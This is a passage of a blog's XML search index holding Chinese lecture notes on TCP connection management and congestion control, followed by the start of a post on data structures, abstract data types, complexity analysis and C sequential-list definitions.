接收方发送过来的rwnd值</p><p>保证接收方不会被淹没</p><p>连接管理<br>在正式交换数据之前，发送方和接收方握手建立通信关系:</p><p>同意建立连接（每一方都知道对方愿意建立连接）<br>同意连接参数（准备、初始化资源）</p><p>建立连接<br>首先考虑2次握手总是可行的吗？（仅一方发送连接请求，另一方收到后发送连接确认）<br>有很多因素会导致2次握手的失败：</p><p>变化的延迟（连接请求的段没有丢，但可能超时）<br>由于丢失造成的重传 (e.g. req_conn(x))<br>报文乱序<br>相互看不到对方</p><p>2次握手的失败场景：</p><p>说明<br>在客户端接收服务器发来的连接确认之前定时器到时，那么客户端就会再发送一条新的连接建立请求，如此服务器会消耗资源去维护许多不必要的“半连接”。<br>数据超时会导致服务器将老数据按照新的数据处理。</p><p>所以2次握手是不可取的，由此引入了3次握手。</p><p>SYNbit &#x3D; 1 表示建立连接请求</p><p>3次握手可以有效地解决半连接和接收老数据的问题</p><p>3次握手的FSM表示：</p><p>关闭连接</p><p>客户端，服务器分别关闭它自己这一侧的连接</p><p>发送FIN bit &#x3D; 1的TCP段</p><p>一旦接收到FIN，用ACK回应</p><p>接到FIN段，ACK可以和它自己发出的FIN段一起发送</p><p>可以处理同时的FIN交换</p><p>这样的连接拆除方式并不完美：<br>会存在一方拆除连接，另一方还维持连接的情况。</p><p>拥塞控制原理<br>拥塞的非正式定义: “太多的数据需要网络传输，超过了网络的处理能力。”<br>拥塞控制与流量控制不同：拥塞控制指的是网络的问题，流量控制指的是接收方的问题。<br>拥塞的表现:</p><p>分组丢失 (路由器缓冲区溢出)<br>分组经历比较长的延迟(在路由器的队列中排队)</p><p>拥塞是网络中前10位的问题</p><p>产生拥塞的原因&#x2F;代价<br>场景一：</p><p>2个发送端，2个接收端<br>一个路由器，具备无限大的缓冲<br>输出链路带宽：R<br>没有重传</p><p>如左图：当λin逐渐增加时，λout也在增加，当λin达到R&#x2F;2时，λout达到最大值，也就是说每个连接的最大吞吐量为R&#x2F;2。<br>如右图：从延迟的角度看，当进入的速率λin接近链路链路带宽R时，延迟陡增。</p><p>场景二：</p><p>一个路由器，有限的缓冲<br>分组丢失时，发送端重传</p><p>应用层的输入&#x3D;应用层输出：λin &#x3D; λout<br>传输层的输入包括重传：λin ≥ λout</p><p>理想化场景：发送端有完美的信息，即发送端知道什么时候路由器的缓冲是可用的。</p><p>只在缓冲可用时发送</p><p>不会丢失：λ’in &#x3D; λin</p><p>这样情况依然同上：</p><p>但是这样的代价很大：每个路由器都需要告知发送方自己的空闲缓冲区有多大，不好实现。</p><p>理想化场景二：掌握丢失信息。即分组可以丢失，在路由器由于缓冲器满而被丢弃。</p><p>如果知道分组丢失了，发 送方重传分组</p><p>会丢失：λ’in &gt; λin</p><p>分析：这样一来，为了让λout逼近于R&#x2F;2，就需要让λ’in比既定的输出要大（因为存在分组丢失）。</p><p>重传的丢失分组<br>没有必要重传的重复分组</p><p>代价：</p><p>为了达到一个有效输出，网络需要做更多的工作（重传）<br>没有必要的重传，链路中包括了多个分组的拷贝（超时）</p><p>是那些没有丢失，经历的时间比较长（拥塞状态）但是超时的分组</p><p>因为网络拥塞而导致接收效率降低，而为了提高接收效率，就会增加发送量，如此一来会加剧网络拥塞，如果不加以控制，那么网络最终会瘫痪。这也是拥塞的特性。</p><p>场景三：</p><p>4个发送端</p><p>多重路径</p><p>超时／重传</p><p>从宏观上来看，各方都不停地向网络中发送数据，就会发生网络拥塞的一个极致：整个网络出现死锁的情况<br>代价：当分组丢失时，任何“关于这个分组的上游传输能力” 都被浪费了。</p><p>拥塞控制方法</p><p>端到端拥塞控制：</p><p>没有来自网络的显式反馈<br>端系统根据延迟和丢失事件推断是否有拥塞<br>TCP采用此方法</p><p>网络辅助的拥塞控制：</p><p>路由器提供给端系统以反馈信息</p><p>单个bit置位，显示有拥塞 (SNA, DECbit,TCP&#x2F;IP ECN, ATM)<br>显式提供发送端可以采用的速率</p><p>首先来了解网络辅助的拥塞控制，以 ATM ABR 拥塞控制为例<br>ABR: available bit rate: ATM网络的其中一个模式</p><p>“弹性服务”<br>如果发送端的路径“轻载 ”</p><p>发送方尽可能使用可用带宽</p><p>如果发送方的路径拥塞了：</p><p>发送方限制其发送的速度到一个最小保障速率上</p><p>RM (资源管理) 信元:</p><p>由发送端发送,在数据信元中间隔插入<br>RM信元中的比特被交换机设置 (“网络辅助”)</p><p>NI bit: no increase in rate (轻微拥塞)速率不要增加了<br>CI bit: congestion indication 拥塞指示</p><p>发送端发送的RM 信元被接收端返回, 接收端不做任何改变</p><p>在RM信元中的2个字节 ER (explicit rate)字段</p><p>拥塞的交换机可能会降低信元中ER的值<br>发送端发送速度因此是最低的可支持速率</p><p>数据信元中的EFCI bit: 被拥塞的交换机设置成1</p><p>如果在管理信元RM前面的数据信元EFCI被设置成了1, 接收端在返回的RM信元中设置CI bit</p><p>TCP拥塞控制<br>TCP采用端到端的拥塞控制。<br>端到端的拥塞控制机制：</p><p>路由器不向主机有关拥塞的反馈信息</p><p>路由器的负担较轻<br>符合网络核心简单的TCP&#x2F;IP架构原则（复杂性放在网络边缘，传输层及以上）</p><p>端系统根据自身得到的信息，判断是否发生拥塞，从而采取动作</p><p>拥塞控制的几个问题：</p><p>如何检测拥塞：</p><p>轻微拥塞<br>拥塞</p><p>控制策略：</p><p>在拥塞发送时如何动作，降低速率</p><p>轻微拥塞，如何降低<br>拥塞时，如何降低</p><p>在拥塞缓解时如何动作，增加速率</p><p>拥塞感知</p><p>某个段超时了（丢失事件 ）：拥塞</p><p>超时时间到，某个段的确认没有来<br>原因1：网络拥塞（某个路由器缓冲区没空间了，被丢弃），概率大<br>原因2：出错被丢弃了（各级错误，没有通过校验，被丢弃），概率小<br>一旦超时，就认为拥塞了，有一定误判，但是总体控制方向是对的</p><p>有关某个段的3次重复ACK：轻微拥塞（如下图）</p><p>段的第1个ack，正常，确认绿段，期待红段</p><p>段的第2个重复ack，意味着红段的后一段收到了，蓝段乱序到达</p><p>段的第2、3、4个ack重复，意味着红段的后第2、3、4个段收到了，橙段乱序到达，同时红段丢失的可能性很大（后面3个段都到了，红段都没到）</p><p>网络这时还能够进行一定程度的传输，拥塞但情况要比第一种好</p><p>速率控制方法</p><p>维持一个拥塞窗口的值：CongWin</p><p>发送端限制已发送但是未确认的数据量（的上限）:<br>LastByteSent - LastByteAcked ≤ CongWin</p><p>从而粗略地控制发送方的往网络中注入的速率（如下公式）：<br>$$rate ≈ \frac{ConWin}{RTT} bytes&#x2F;sec<br>$$</p><p>CongWin是动态的，是感知到的网络拥塞程度的函数：</p><p>超时或者3个重复ack，CongWin会下降：</p><p>超时时：CongWin降为1MSS,进入SS阶段然后再倍增到CongWin&#x2F;2（每个RTT），从而进入CA阶段<br>3个重复ack ：CongWin降为CongWin&#x2F;2，CA阶段</p><p>如果没有超时：CongWin会上升</p><p>SS（慢启动）阶段：加倍增加(每个RTT)<br>CA（拥塞避免）阶段：线性增加(每个RTT)</p><p>联合控制的方法：<br>TCP拥塞控制和流量控制的联合动作。<br>发送端控制发送但是未确认的量同时也不能够超过接收窗口，满足流量控制要求：</p><p>SendWin &#x3D; min {CongWin, RecvWin}<br>同时满足拥塞控制和流量控制要求</p><p>TCP拥塞控制策略</p><p>慢启动<br>AIMD：线性增、乘性减少<br>超时事件后的保守策略</p><p>TCP慢启动：</p><p>连接刚建立, CongWin &#x3D; 1 MSS</p><p>例如： MSS &#x3D; 1460bytes  &amp; RTT &#x3D; 200 msec，则初始速率 &#x3D; 58.4kbps</p><p>但是可用带宽可能远大于MSS&#x2F;RTT，所以应该尽快加速，到达希望的速率</p><p>当连接开始时，指数性增加（每个RTT）发送速率直到发生丢失事件</p><p>每一个RTT， CongWin加倍<br>每收到一个ACK时，CongWin加1<br>慢启动阶段：只要不超时或3个重复ack，一个RTT，CongWin加倍</p><p>初始速率很慢，但是加速却是指数性的</p><p>AIMD：</p><p>乘性减：<br>丢失事件后将CongWin降为1，将CongWin&#x2F;2作为阈值，进入慢启动阶段（倍增直到 CongWin&#x2F;2）</p><p>加性增：<br>当CongWin &gt; 阈值时，一个RTT如没有发生丢失事件 ,将CongWin加1MSS: 探测</p><p>策略不同：</p><p>当收到3个重复的ACKs：</p><p>CongWin 减半<br>窗口（缓冲区大小）之后线性增长</p><p>当超时事件发生时：</p><p>CongWin被设置成 1 MSS，进入SS阶段<br>之后窗口指数增长<br>增长到一个阈值（上次发生拥塞的窗口的一半）时 ，再线性增加</p><p>再次强调一下何时候应该将指数性增长变成线性增长：<br>在超时之前，当 CongWin变成上次发生超时的窗口的一半时<br>具体实现：</p><p>变量：Threshold</p><p>出现丢失，Threshold设置成 CongWin的1&#x2F;2</p><p>小结</p><p>事件<br>状态<br>TCP 发送端行为<br>解释</p><p>以前没有收到ACK的data被ACKed<br>慢启动 (SS)<br>CongWin &#x3D; CongWin + MSS If (CongWin &gt; Threshold) ,状态变成 “CA”<br>每一个RTT CongWin 加倍</p><p>以前没有收到ACK的data 被ACKed<br>拥塞避免 (CA)<br>CongWin &#x3D; CongWin+MSS × (MSS&#x2F;CongWin)<br>加性增加, 每一个RTT对 CongWin 加一个 1 MSS</p><p>通过收到3个重复的ACK，发现丢失的事件<br>SS or CA<br>Threshold &#x3D; CongWin&#x2F;2，CongWin &#x3D; Threshold+3，状态变成“CA”，<br>快速重传, 实现乘性的减，CongWin 没有变成1 MSS.</p><p>超时<br>SS or CA<br>Threshold &#x3D; CongWin&#x2F;2,CongWin &#x3D; 1 MSS,状态变成“SS”<br>进入slow start</p><p>重复的 ACK<br>SS or CA<br>对被ACKed 的segment， 增加重复ACK的计数<br>CongWin and Threshold 不变</p><p>TCP吞吐量<br>使用窗口window尺寸W和RTT来描述TCP的平均吞吐量（忽略慢启动阶段，假设发送端总有数据传输）：</p><p>W：发生丢失事件时的窗口尺寸（单位：字节）</p><p>平均窗口尺寸：3&#x2F;4W</p><p>平均吞吐量：RTT时间吞吐3&#x2F;4W<br>$$avg TCPthtuput &#x3D; \frac{3}{4}\frac{W}{RTT} bytes&#x2F;sec<br>$$</p><p>TCP公平性<br>公平性目标: 如果 K个TCP会话分享一个链路带宽为R的瓶颈，每一个会话的有效带宽为 R&#x2F;K</p><p>分析为什么TCP是公平的（2个竞争的TCP会话为例，假设两个会话的RTT相等）：</p><p>加性增加，斜率为1, 吞吐量增加</p><p>乘性减，吞吐量比例减少</p><p>（具体省略详细解释，但是这个平衡的过程真的很神奇）</p><p>考虑并行TCP连接：</p><p>如果带宽为R的链路支持了 9个TCP连接</p><p>如果新的应用要求建1个TCP连接,获得带宽R&#x2F;10<br>如果新的应用要求建11个TCP 连接,获得带宽R&#x2F;2</p>]]></content>
      
      
      <categories>
          
          <category> 专业课程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从0到1学习数据结构与算法（更新中）</title>
      <link href="/post/896d251.html"/>
      <url>/post/896d251.html</url>
      
        <content type="html"><![CDATA[<h1 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h1><h2 id="0-数据结构的研究内容"><a href="#0-数据结构的研究内容" class="headerlink" title="0.数据结构的研究内容"></a>0.数据结构的研究内容</h2><p>研究非数值计算的程序设计问题中计算机的操作对象以及它们之间的关系和操作。</p><p>实践中即设计出合适的数据结构及相应的算法即：首先要考虑对相关的各种信息如何表示、组织和存储？</p><h2 id="1-基本概念和术语"><a href="#1-基本概念和术语" class="headerlink" title="1.基本概念和术语"></a>1.基本概念和术语</h2><p>1.<strong>数据</strong>（data）：<br>所有能输入到计算机中去的描述客观事物的符号。</p><pre><code>数值性数据（实数、整数）非数值性数据（多媒体信息处理：字符串、图形、图像、声音）</code></pre><p>2.<strong>数据元素</strong>（data element）：<br>数据的基本单位，也<br>称结点（node）或<br>记录（record）</p><p>3.<strong>数据项</strong>（data item）：<br>组成数据元素的、有独立含义的、不可分割的数据最小单位，也称域&#x2F;字段(field)</p><p>4、<strong>数据对象</strong>(Data Object)：<br>相同特性数据元素的集合，是数据的一个子集</p><p>5、<strong>数据结构</strong>（Data Structure）<br>是相互之间存在一种或多种特定关系的数据元素的集合。</p><blockquote><p>数据结构的两个层次：</p></blockquote><ul><li><p><strong>逻辑结构</strong>:数据元素间抽象化的相互关系，与数据的存储无关，独立于计算机，它是从具体问题抽象出来的数学模型</p></li><li><p><strong>存储结构</strong>（物理结构）:数据元素及其关系在计算机存储器中的存储方式。</p></li></ul><h3 id="一、逻辑结构"><a href="#一、逻辑结构" class="headerlink" title="一、逻辑结构"></a>一、逻辑结构</h3><p>分法1：</p><ul><li>线性结构—-<br>有且仅有一个开始和一个终端结点<br>，并且所有结点都最多只有一个直<br>接前趋和一个后继。<br>例如：线性表、栈、队列、串</li><li>非线性结构—-<br>一个结点可能有多个直接前趋和直<br>接后继。<br>例如：树、图</li></ul><p>分法2：</p><p><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%88%92%E5%88%86%E6%96%B9%E6%B3%952.png" alt="分法二"></p><h3 id="二、存储结构"><a href="#二、存储结构" class="headerlink" title="二、存储结构"></a>二、存储结构</h3><p>存储结构分为：</p><ul><li><strong>顺序存储结构</strong>借助元素在存储器中的相对位置来表示数据元素间的逻辑关系。（需要一片连续存储空间，一般借助数组来描述）</li><li><strong>链式存储结构</strong>借助指示元素存储地址的指针表示数据元素间的逻辑系。（无需占用一整块存储空间）</li></ul><blockquote><p>数据的运算</p></blockquote><p>逻辑结构和存储结构都相同, 但运算不同, 则数据结构不同. 例如, 栈与队列</p><p>对于一种数据结构, 常见的运算:<br><em>插入 删除 修改 查找 排序</em></p><blockquote><p><strong>数据类型</strong>：在一种程序设计语言中，变量所具有的数据种类</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FORTRAN语言：整型、实型、和复数型</span><br><span class="line">C语言：基本数据类型： char int float double void</span><br><span class="line">       构造数据类型：数组、结构体、共用体、文件</span><br></pre></td></tr></table></figure><blockquote><p><strong>抽象数据类型</strong></p></blockquote><ul><li>更高层次的数据抽象。</li><li>由用户定义，用以表示应用问题的数据<br>模型。</li><li>由基本的数据类型组成, 并包括一组相关<br>的操作。</li></ul><p>抽象数据类型可以用以下三元组表示：</p><pre><code>ADT=(D,S,P)D是数据对象S是D上的关系集P是D上的操作集</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ADT抽象数据类型名&#123;</span><br><span class="line">  数据对象：&lt;数据对象的定义&gt;</span><br><span class="line">  数据关系：&lt;数据关系的定义&gt;</span><br><span class="line">  基本操作：&lt;基本操作的定义&gt;</span><br><span class="line">&#125;ADT抽象数据类型名</span><br></pre></td></tr></table></figure><h2 id="2-抽象数据类型的表示与实现"><a href="#2-抽象数据类型的表示与实现" class="headerlink" title="2.抽象数据类型的表示与实现"></a>2.抽象数据类型的表示与实现</h2><p>（1）预定义常量及类型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//预定义常量：函数结果状态代码</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OK 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ERROR 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OVERFLOW 2</span></span><br><span class="line"><span class="comment">//预定义类型status是函数返回值类型，其值是函数结果状态代码。</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> Status; <span class="comment">//给类型定义新名字</span></span><br></pre></td></tr></table></figure><p>（2）数据元素被约定为ElemType类型，用户需要根据具体情况，自行定义该数据类型。</p><p>（3）算法去描述为以下的函数形式：</p><pre><code>函数类型 函数名（函数参数表）&#123;  语句序列;&#125;</code></pre><p>（4）内存的动态分配与释放<br>使用new和delete动态分配和释放内存空间</p><p>分配空间  指针变量&#x3D;new数据类型；</p><p>释放空间   delete指针变量；</p><p>（5）赋值语句</p><p>（6）选择语句</p><p>（7）循环语句</p><p>（8）使用的结束语句形式有</p><ul><li>函数结束语句retum</li><li>循环结束语句break;</li><li>异常结束语句exit（异常代码）</li></ul><p>（9）输入输出语句形式有</p><ul><li>输入语句cin(scanf())</li><li>输出语句cout(printf())</li></ul><p>（10）扩展函数有</p><ul><li>求最大值max</li><li>求最小值mm</li></ul><h2 id="3-算法与算法分析"><a href="#3-算法与算法分析" class="headerlink" title="3.算法与算法分析"></a>3.算法与算法分析</h2><h3 id="3-1一些定义与理解"><a href="#3-1一些定义与理解" class="headerlink" title="3.1一些定义与理解"></a>3.1一些定义与理解</h3><p><strong>算法</strong>：一个有穷的指令集，这些指令为解决某一特定任务规定了一个运算序列</p><p>算法的描述：</p><pre><code>自然语言流程图程序设计语言伪码</code></pre><p><strong>算法效率</strong>：用依据该算法编制的程序在计算机上执行所消耗的时间来度量</p><ul><li><strong>问题</strong>规模是算法求解问题<strong>输入量</strong>的多少，是问题大小的本质表示，一般用<strong>整数n</strong>表示</li><li><strong>算法的执行时间</strong>大致等于所有语句执行时间的<strong>总和</strong>，而语句的执行时间则为该条语句的<strong>重复执行次数</strong>和<strong>执行一次所需时间</strong>的乘积，一条语句的重复执行次数被称为<strong>语句频度</strong></li><li>算法分析并非统计精确执行时间</li><li>若每条语句执行一次所需时间均是单位时间，则一个算法的<br>执行时间可用算法的所有语句（通常只考虑“基本语句”）频度之和度量。</li><li>基本语句：指算法中重复执行次数和算法的执行时间成正比<br>的语句</li></ul><h3 id="3-2时间复杂度的渐进表示法"><a href="#3-2时间复杂度的渐进表示法" class="headerlink" title="3.2时间复杂度的渐进表示法"></a>3.2时间复杂度的渐进表示法</h3><blockquote><p>通常，算法中基本语句重复执行的次数是问题规模n的某个函数f(n),算法的时间量度记作：<em><strong>T(n)&#x3D;O(f(n))</strong></em></p></blockquote><pre><code>  n越大算法的执行时间越长  ·排序：n为记录数  ·矩阵：n为矩阵的阶数  ·多项式：n为多项式的项数  ·集合：n为元素个数  ·树：n为树的结点个数  ·图：n为图的顶点数或边数</code></pre><h3 id="3-3分析时间复杂度的基本方法"><a href="#3-3分析时间复杂度的基本方法" class="headerlink" title="3.3分析时间复杂度的基本方法"></a>3.3分析时间复杂度的基本方法</h3><ul><li>找出语句频度最大的那条语句作为基本语句</li><li>计算基本语句的频度得到问题规模月的某个函数／(n)</li><li>取其数量级用符号“0“表示</li></ul><p><img src="/img/%E6%97%B6%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A61.png" alt="时间复杂度1"></p><p><img src="/img/%E6%97%B6%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6%E4%BE%8B1.png" alt="时间复杂度例1"></p><p><img src="/img/%E6%97%B6%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6%E4%BE%8B2.png" alt="时间复杂度例2"></p><p><img src="/img/%E5%B8%B8%E8%A7%81%E7%B4%AF%E5%8A%A0%E6%B1%82%E5%92%8C%E5%85%AC%E5%BC%8F.png" alt="常见累加求和公式"></p><p><img src="/img/%E5%A4%8D%E6%9D%82%E5%BA%A6%E6%8E%92%E5%BA%8F.png" alt="复杂度排序"></p><h3 id="3-4渐进空间复杂度"><a href="#3-4渐进空间复杂度" class="headerlink" title="3.4渐进空间复杂度"></a>3.4渐进空间复杂度</h3><p>空间复杂度：算法所需存储空间的度量，记作： <em><strong>S(n)&#x3D;O(f(n))</strong></em><br>其中n为问题规模（或大小）</p><p><img src="/img/%E6%B8%90%E8%BF%9B%E7%A9%BA%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A61.png" alt="渐进空间复杂度1"></p><h1 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h1><p>线性结构：<br>线性结构表达式：（a1 , a2 , ……, an）</p><blockquote><p>线性结构的特点：</p></blockquote><pre><code>① 只有一个首结点和尾结点；② 除首尾结点外，其他结点只有一个直接前驱和一个直接后继。</code></pre><p>简言之，线性结构反映结点间的逻辑关系是 一对一 的<br>线性结构包括线性表、堆栈、队列、字符串、数组等等，<br>其中，最典型、最常用的是线性表</p><h2 id="1线性表的定义和特点"><a href="#1线性表的定义和特点" class="headerlink" title="1线性表的定义和特点"></a>1线性表的定义和特点</h2><p>线性表的定义：用数据元素的有限序列表示</p><p><img src="/img/%E7%BA%BF%E6%80%A7%E8%A1%A8%E7%9A%84%E5%AE%9A%E4%B9%89%E5%92%8C%E7%89%B9%E7%82%B9.png" alt="线性表的定义和特点"></p><p>数据元素都是字母; 元素间关系是线性</p><p>同一线性表中的元素必定具有相同特性</p><h2 id="2案例引入"><a href="#2案例引入" class="headerlink" title="2案例引入"></a>2案例引入</h2><p><img src="/img/%E7%BA%BF%E6%80%A7%E8%A1%A8%E6%A1%88%E4%BE%8B.png" alt="线性表案例"><br>总结：</p><ul><li>线性表中数据元素的类型可以为简单类型（一元多项式），也可以为复杂类型（图书信息）。</li><li>许多实际应用问题所涉的基本操作有很大相似性，不应为每个具体应用单独编写一个程序。</li><li>从具体应用中抽象出共性的逻辑结构和基本操作（抽象数据类型），然后实现其存储结构和基本操作。</li></ul><h2 id="3线性表的类型定义"><a href="#3线性表的类型定义" class="headerlink" title="3线性表的类型定义"></a>3线性表的类型定义</h2><blockquote><p>线性表的重要基本操作</p></blockquote><p>初始化,取值，查找，插入，删除</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">ADT List&#123;</span><br><span class="line">数据关系：R=&#123;&lt;a i-1 ,ai&gt;lai-1 pai ED,i=2,…,n&#125;</span><br><span class="line">基本操作：</span><br><span class="line">Init List&#123;&amp;L&#125;</span><br><span class="line">操作结果：构造一个空的线性表L。</span><br><span class="line">Destroy List(&amp;L)</span><br><span class="line">初始条件：线性表L已存在.</span><br><span class="line">操作结果：销毁线性表L。</span><br><span class="line">Clear List I EL</span><br><span class="line">初始条件：线性表L已存在。</span><br><span class="line">操作结果：将L重置为空表。</span><br><span class="line">List Empty(L)</span><br><span class="line">初始条件：线性表L已存在。</span><br><span class="line">操作结果：若L为空表，则返回true，否则返回 false o</span><br><span class="line">List Length(L)</span><br><span class="line">初始条件：线性表L已存在</span><br><span class="line">操作结果：返回中数据元素个数。</span><br><span class="line">Get El em（L，i,&amp;e）</span><br><span class="line">初始条件：线性表L已存在，且１≤i≤List Length(L)。</span><br><span class="line">操作结果：用e返回中第1个数据元素的值，</span><br><span class="line">Locate El em(L,e)</span><br><span class="line">初始条件：线性表L已存在，</span><br><span class="line">操作结果：返回L中第1个值与e相同的元素在L中的位置。若这样的数据元素不存在，则返回值为0。</span><br><span class="line">Prior El em(I,cur_e,&amp;pre_e)</span><br><span class="line">初始条件：线性表L已存在。</span><br><span class="line">操作结果：若cur_e是L的数据元素，且不是第一个，则用pre_e返回其前驱，否则操作失败，pre_e无定义</span><br><span class="line">NextElem(L,cur_e,&amp;next_e)</span><br><span class="line">初始条件：线性表L已存在.</span><br><span class="line">操作结果：若cur_e是L的数据元素，且不是最后一个，则用next_e返回其后继，否则操作失败，next_e无定义。</span><br><span class="line">List Insert(&amp;L,ive)</span><br><span class="line">初始条件：线性表L已存在，且1≤i≤List Length(L)+1 o</span><br><span class="line">操作结果：在L中第i个位置之前插人新的数据元索e，L的长度加1。</span><br><span class="line">List Delete l&amp;L i</span><br><span class="line">初始条件：线性表L已存在且非空，且1≤i≤List Length（L）。</span><br><span class="line">操作结果：删除L的第i个数据元素，L的长度减1。</span><br><span class="line">初始条件：线性表L已存在。</span><br><span class="line">操作结果：对线性表工进行遍历，在遍历过程中对工的每个结点访问一次。</span><br><span class="line">&#125;ADT List</span><br></pre></td></tr></table></figure><ul><li>抽象数据类型仅为模型<br>定义，不涉及具体实现</li><li>该抽象数据类型给出的<br>操作是基本操作，基于<br>此可以构成其他更复杂<br>操作</li><li>对于不同应用，基本操<br>作的接口可能不同</li><li>抽象数据类型定义的线<br>性表可根据实际所采用<br>的存储结构形式进行具<br>体的表示和实现</li></ul><h2 id="4线性表的顺序表示和实现"><a href="#4线性表的顺序表示和实现" class="headerlink" title="4线性表的顺序表示和实现"></a>4线性表的顺序表示和实现</h2><blockquote><p>线性表的顺序表示又称为顺序存储结构或顺序映像</p></blockquote><p><em><strong>顺序存储</strong></em><br>把逻辑上相邻的数据元素存储在物理上相邻的存储单元中的存储结构。简言之，逻辑上相邻，物理上也相邻</p><p><em><strong>顺序存储</strong></em><br>用一组地址连续的存储单元依次存储线性表的元素，可通过数组V[n]来实现</p><h3 id="4-1顺序表的类型定义"><a href="#4-1顺序表的类型定义" class="headerlink" title="4.1顺序表的类型定义"></a>4.1顺序表的类型定义</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAXSIZE 100 <span class="comment">//最大长度</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> //定义顺序表结构体</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">ElemType *elem; <span class="comment">//指向数据元素的基地址， ElemType为统一描述而定义，实际使用用基本类型或者结构体替换</span></span><br><span class="line"><span class="type">int</span> length; <span class="comment">//线性表的当前长度（注意：C语言中数组的下标是从0开始，元素位置序号是从1开始） </span></span><br><span class="line">&#125;SqList； <span class="comment">//顺序表的结构类型为SqList，结构体别名</span></span><br></pre></td></tr></table></figure><blockquote><p>一元多项式</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAXSIZE 100 <span class="comment">//多项式可能达到的最大长度</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> //多项式非零项的定义</span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line"><span class="type">float</span> coef; <span class="comment">//系数</span></span><br><span class="line"><span class="type">int</span> expn; <span class="comment">//指数</span></span><br><span class="line">&#125;Polynomial; </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line">Polynomial *elem; <span class="comment">//存储空间的基地址</span></span><br><span class="line"><span class="type">int</span> length; <span class="comment">//多项式中当前项个数</span></span><br><span class="line">&#125;SqList; <span class="comment">//多项式的顺序存储结构类型为SqList</span></span><br></pre></td></tr></table></figure><blockquote><p>图书顺序表</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAXSIZE 10000 <span class="comment">//图书表可能达到的最大长度</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> //图书信息定义</span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line"><span class="type">char</span> no[<span class="number">20</span>]; <span class="comment">//图书ISBN</span></span><br><span class="line"><span class="type">char</span> name[<span class="number">50</span>]; <span class="comment">//图书名字</span></span><br><span class="line"><span class="type">float</span> price; <span class="comment">//图书价格</span></span><br><span class="line">&#125;Book; </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line">Book *elem; <span class="comment">//存储空间的基地址（ElemType 为Book结构体）</span></span><br><span class="line"><span class="type">int</span> length; <span class="comment">//图书表中当前图书个数</span></span><br><span class="line">&#125;SqList; <span class="comment">//图书表的顺序存储结构类型为SqList</span></span><br></pre></td></tr></table></figure><blockquote><p>补充：C语言的动态分配函数（ &lt;stdlib.h&gt; ）</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(m)</span><br><span class="line"><span class="comment">//开辟m字节长度的地址空间，并返回这段空间的首地址</span></span><br><span class="line"><span 